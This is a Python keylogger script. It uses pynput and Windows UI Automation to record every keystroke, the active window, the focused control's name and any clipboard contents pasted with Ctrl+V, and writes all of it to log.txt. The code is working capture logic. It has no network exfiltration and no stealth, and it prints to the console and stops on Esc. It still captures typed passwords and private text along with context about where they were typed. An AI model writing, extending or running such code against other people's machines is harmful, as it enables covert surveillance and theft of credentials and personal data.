from pynput import keyboard
from my_logging import Logger
from util import get_active_window, get_save_info
import pyperclip
import uiautomation as auto


class KeyLogger:
    def __init__(self, filename: str = "log.txt"):
        self.filename = filename

        self.logger = Logger(filename = filename)

        self.char_keys = None
        self.prev_control = self.get_control()
        self.previous_win_info = get_active_window()
        
    def get_control(self):
        control = auto.GetFocusedControl()
        return {"class" : control.ClassName,  "name" : control.Name if "Shift+Alt+F1" not in control.Name else ""}

    # --- Keyboard functions ---
    def _on_press(self, key, injected = False):
        win_info = get_active_window()
        control = self.get_control()

        try:
            print(f"Keyboard: Key pressed -> {key.char}")
            

            if key.char == "\x16":
                print(f"Paste command : {pyperclip.paste()}")
                self.write(pyperclip.paste(), win_info=win_info, control=control)
                self.char_keys = None
                self.previous_win_info = win_info
                self.prev_control = control
                return
            

            if self.previous_win_info != win_info or not self.char_keys or self.prev_control != control:
                self.char_keys =  key.char
                self.write(self.char_keys, win_info=win_info, control=control)
                self.previous_win_info = win_info
                self.prev_control = control
                return
            
            

            self.char_keys += key.char
            self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
            self.prev_control = control
            self.previous_win_info = win_info

            
        except AttributeError:
            print(f"Keyboard: Special key pressed -> {key}")
            if key == keyboard.Key.space:
                if self.previous_win_info == win_info and self.char_keys:
                    self.char_keys += " "
                    self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
                    return
                
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                return
            
            if key == keyboard.Key.backspace:

                if self.previous_win_info == win_info and self.char_keys:
                    self.char_keys = self.char_keys[:-1]
                    self.write(self.char_keys, win_info=win_info, control=control, overwrite=True)
                    return

            self.char_keys = None

            
    def _on_release(self, key, injected = False):
        # Remove released key from set
        # try:
        #     self._current_keys.discard(key.char)
        # except AttributeError:
        #     self._current_keys.discard(key)

        print(f"Keyboard: Key released -> {key}")
        if key == keyboard.Key.esc:
            return False  # stop listener
       
        
    def write(self, message, win_info: dict = None, control: dict = None, overwrite = False):
        print(f"contol : {control}")
        control_txt = ''
        if control['name']:
            control_txt = f"[name : {control['name']}]"
        
        self.logger.write(f"{get_save_info(win_info=win_info)} {control_txt} {message}", overwrite = overwrite)
        

    def run(self):

        self.keyboard_listener = keyboard.Listener(
            on_press = self._on_press, 
            on_release = self._on_release
        )

        self.keyboard_listener.start()
        self.keyboard_listener.join()


if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.run()
